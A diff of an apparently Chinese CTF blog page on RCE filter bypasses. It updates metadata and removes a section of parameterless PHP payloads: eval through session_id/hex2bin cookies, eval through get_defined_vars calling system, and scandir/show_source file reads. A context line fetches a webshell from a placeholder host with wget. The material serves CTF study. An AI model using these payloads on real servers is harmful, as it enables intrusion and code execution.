@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png">
 <meta property="article:published_time" content="2025-01-21T13:29:33.000Z">
-<meta property="article:modified_time" content="2025-07-07T12:02:46.148Z">
+<meta property="article:modified_time" content="2025-08-25T01:44:27.526Z">
 <meta property="article:author" content="AyaN0">
 <meta property="article:tag" content="-Web -CTF">
 <meta name="twitter:card" content="summary">
@@ -161,7 +161,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text"> RCE（远程代码执行漏洞）原理及漏洞相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text"> 空格过滤绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 大括号{}：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ifs%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.1.2.</span> <span class="nav-text"> $IFS代替空格：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E5%AD%97%E7%AC%A6"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 重定向字符&lt;，&lt;&gt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.1.4.</span> <span class="nav-text"> 其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text"> 文件名过滤绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.1.</span> <span class="nav-text"> ??,*绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">1.2.2.</span> <span class="nav-text"> ;过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="nav-number">1.2.3.</span> <span class="nav-text"> &#x2F;过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99"><span class="nav-number">1.2.4.</span> <span class="nav-text"> 单引号(&#39;)双引号(“”)反引号(&#96;&#96;)绕过正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.5.</span> <span class="nav-text"> 反斜杠\绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F1%E5%88%B09-%E5%92%8C"><span class="nav-number">1.2.6.</span> <span class="nav-text"> 特殊变量：$1到9、9、9、@和$*</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E9%80%9A%E8%BF%87%E8%B5%8B%E5%80%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.7.</span> <span class="nav-text"> 内联执行绕过（通过赋值绕过）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.8.</span> <span class="nav-text"> 利用linux中的环境变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 常见文件读取命令绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.1.</span> <span class="nav-text"> base64编码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base32%E7%BC%96%E7%A0%81%E5%90%8C%E7%90%86"><span class="nav-number">1.3.2.</span> <span class="nav-text"> base32编码同理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hex%E7%BC%96%E7%A0%81ascii%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.3.</span> <span class="nav-text"> HEX编码（ASCII编码）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python%E8%84%9A%E6%9C%AC"><span class="nav-number">1.3.3.1.</span> <span class="nav-text"> python脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxd-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%98%BE%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E5%B7%A5%E5%85%B7"><span class="nav-number">1.3.3.2.</span> <span class="nav-text"> xxd: 二进制显示和处理文件工具。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shellcode%E7%BC%96%E7%A0%8116%E8%BF%9B%E5%88%B6%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="nav-number">1.3.3.3.</span> <span class="nav-text"> shellcode编码（16进制的机器码）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E8%A2%AB%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text"> 读取命令被绕过：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.</span> <span class="nav-text"> 无回显时间盲注：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%BD%E6%98%AFfakeflag-%E8%AF%95%E8%AF%95%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fprocselfenviron%E5%92%8Cenv%E6%8C%87%E4%BB%A4"><span class="nav-number">1.6.</span> <span class="nav-text"> 都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0"><span class="nav-number">1.7.</span> <span class="nav-text"> 无参数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#scandir"><span class="nav-number">1.7.1.</span> <span class="nav-text"> scandir()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session_id"><span class="nav-number">1.7.2.</span> <span class="nav-text"> session_id()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getallheaders"><span class="nav-number">1.7.3.</span> <span class="nav-text"> getallheaders()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get_defined_vars"><span class="nav-number">1.7.4.</span> <span class="nav-text"> get_defined_vars()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chdir-array_rand"><span class="nav-number">1.7.5.</span> <span class="nav-text"> chdir() &amp; array_rand()</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text"> RCE（远程代码执行漏洞）原理及漏洞相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.</span> <span class="nav-text"> 空格过滤绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 大括号{}：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ifs%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.1.2.</span> <span class="nav-text"> $IFS代替空格：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E5%AD%97%E7%AC%A6"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 重定向字符&lt;，&lt;&gt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.1.4.</span> <span class="nav-text"> 其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text"> 文件名过滤绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.1.</span> <span class="nav-text"> ??,*绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">1.2.2.</span> <span class="nav-text"> ;过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="nav-number">1.2.3.</span> <span class="nav-text"> &#x2F;过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99"><span class="nav-number">1.2.4.</span> <span class="nav-text"> 单引号(&#39;)双引号(“”)反引号(&#96;&#96;)绕过正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.5.</span> <span class="nav-text"> 反斜杠\绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F1%E5%88%B09-%E5%92%8C"><span class="nav-number">1.2.6.</span> <span class="nav-text"> 特殊变量：$1到9、9、9、@和$*</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E9%80%9A%E8%BF%87%E8%B5%8B%E5%80%BC%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.7.</span> <span class="nav-text"> 内联执行绕过（通过赋值绕过）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.8.</span> <span class="nav-text"> 利用linux中的环境变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 常见文件读取命令绕过：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.1.</span> <span class="nav-text"> base64编码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base32%E7%BC%96%E7%A0%81%E5%90%8C%E7%90%86"><span class="nav-number">1.3.2.</span> <span class="nav-text"> base32编码同理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hex%E7%BC%96%E7%A0%81ascii%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.3.</span> <span class="nav-text"> HEX编码（ASCII编码）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python%E8%84%9A%E6%9C%AC"><span class="nav-number">1.3.3.1.</span> <span class="nav-text"> python脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxd-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%98%BE%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E5%B7%A5%E5%85%B7"><span class="nav-number">1.3.3.2.</span> <span class="nav-text"> xxd: 二进制显示和处理文件工具。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shellcode%E7%BC%96%E7%A0%8116%E8%BF%9B%E5%88%B6%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="nav-number">1.3.3.3.</span> <span class="nav-text"> shellcode编码（16进制的机器码）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E8%A2%AB%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text"> 读取命令被绕过：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.</span> <span class="nav-text"> 无回显时间盲注：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%BD%E6%98%AFfakeflag-%E8%AF%95%E8%AF%95%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fprocselfenviron%E5%92%8Cenv%E6%8C%87%E4%BB%A4"><span class="nav-number">1.6.</span> <span class="nav-text"> 都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -176,7 +176,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -185,7 +185,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -256,7 +256,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-07-07 20:02:46" itemprop="dateModified" datetime="2025-07-07T20:02:46+08:00">2025-07-07</time>
+      <time title="修改时间：2025-08-25 09:44:27" itemprop="dateModified" datetime="2025-08-25T09:44:27+08:00">2025-08-25</time>
     </span>
 
   
@@ -273,14 +273,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>8k</span>
+      <span>5.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>14 分钟</span>
+      <span>11 分钟</span>
     </span>
 </div>
 
@@ -505,48 +505,6 @@ cat flag | awk NR</mark>2  | cut -c 2      #获取第二个字符</p>
 <pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
 <p>8.dnslog外带数据</p>
 <h2 id="都是fakeflag-试试环境变量procselfenviron和env指令"><a class="markdownIt-Anchor" href="#都是fakeflag-试试环境变量procselfenviron和env指令"></a> 都是fakeflag ,试试环境变量/proc/self/environ和env指令</h2>
-<h2 id="无参数"><a class="markdownIt-Anchor" href="#无参数"></a> 无参数</h2>
-<p>最近打比赛看到一些无参的题目，拿来研究一下</p>
-<h3 id="scandir"><a class="markdownIt-Anchor" href="#scandir"></a> scandir()</h3>
-<p>*scandir()<em>函数可以返回当前目录中的所有文件和目录的列表。通过结合</em>localeconv()<em>和</em>current()*函数，可以构造出一个返回当前目录文件列表的payload。例如：</p>
-<pre><code class="highlight plaintext">?exp=var_dump(next(array_reverse(scandir(current(localeconv()))));
-localeconv()取出一个.并且利用current()取到.向前一个目录移动，再使用scandir扫当前目录，利用array_reverse和next()进行移动</code></pre>
-<p>在这个例子中，*<em>localeconv()<em><em>返回一个包含本地数字及货币格式信息的数组，其中第一个元素是</em>.<em>，表示当前目录。**current()*<em>函数取出这个</em>.</em>，然后传递给</em></em>scandir()**函数，最终返回当前目录的文件列表<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/133808536">1</a>。</p>
-<pre><code class="highlight plaintext">类似的移动指针:
-end() ： 将内部指针指向数组中的最后一个元素，并输出
-next() ：将内部指针指向数组中的下一个元素，并输出
-prev() ：将内部指针指向数组中的上一个元素，并输出
-reset() ： 将内部指针指向数组中的第一个元素，并输出
-each() ： 返回当前元素的键名和键值，并将内部指针向前移动</code></pre>
-<p>还有一个方法就是用<code>getcwd()</code>直接模当前路径，<code>scandir()</code>扫，<code>array_flip</code>交换数组的键和值</p>
-<p>像这样的，还有很多，网上多的是自己慢慢研究</p>
-<pre><code class="highlight plaintext">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
-print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
-print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
-show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
-show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
-show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
-show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
-  //查看和读取根目录文件
-  //查看和读取根目录文件</code></pre>
-<h3 id="session_id"><a class="markdownIt-Anchor" href="#session_id"></a> session_id()</h3>
-<p>当请求头中有cookie时，可以使用**session_id()<strong>函数来获取当前会话ID。通过将命令进行十六进制编码，然后使用</strong>hex2bin()**解码，可以实现命令执行。例如：</p>
-<pre><code class="highlight plaintext">?exp=eval(hex2bin(session_id(session_start())));
-Cookie: PHPSESSID=636174202f666c6167</code></pre>
-<p>同时，需要在cookie中设置相应的十六进制编码值</p>
-<h3 id="getallheaders"><a class="markdownIt-Anchor" href="#getallheaders"></a> getallheaders()</h3>
-<p>*getallheaders()<em>函数返回当前请求的所有请求头信息。可以在请求头中添加恶意代码，然后使用</em>end()*函数指向最后一个请求头，使其执行。例如：</p>
-<pre><code class="highlight plaintext">var_dump(end(getallheaders()));</code></pre>
-<p>在数据包最后一行添加一个请求头，例如<em>sky: phpinfo();</em>，然后*end()*函数会指向这个请求头并执行其中的代码。</p>
-<h3 id="get_defined_vars"><a class="markdownIt-Anchor" href="#get_defined_vars"></a> get_defined_vars()</h3>
-<p><em>get_defined_vars()<em>函数返回所有定义的变量，包括全局变量</em><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>∗</mo><mtext>、</mtext><mo>∗</mo></mrow><annotation encoding="application/x-tex">_GET*、*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">、</span><span class="mord">∗</span></span></span></span>_POST</em>、<em>$_COOKIE</em>等。可以通过添加多个参数来构造payload。例如：</p>
-<pre><code class="highlight plaintext">?a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</code></pre>
-<p>这样可以执行**system(‘ls /’)**命令。</p>
-<h3 id="chdir-array_rand"><a class="markdownIt-Anchor" href="#chdir-array_rand"></a> chdir() &amp; array_rand()</h3>
-<p>通过目录遍历来读取文件。例如，使用*getcwd()<em>获取当前目录，然后使用</em>dirname()*列出父目录中的所有文件和目录。</p>
-<p><code>array_rand()</code>是随机读取数组中的键值，需要配合<code>array_flip</code>使用，<code>chdir()</code>是规定当前的工作目录</p>
-<p>例如：</p>
-<pre><code class="highlight plaintext">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre>
 
     </div>
 
@@ -615,13 +573,13 @@ Cookie: PHPSESSID=636174202f666c6167</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">314k</span>
+    <span title="站点总字数">329k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">9:31</span>
+    <span title="站点阅读时长">9:59</span>
   </span>
 </div>
 <div class="busuanzi-count">
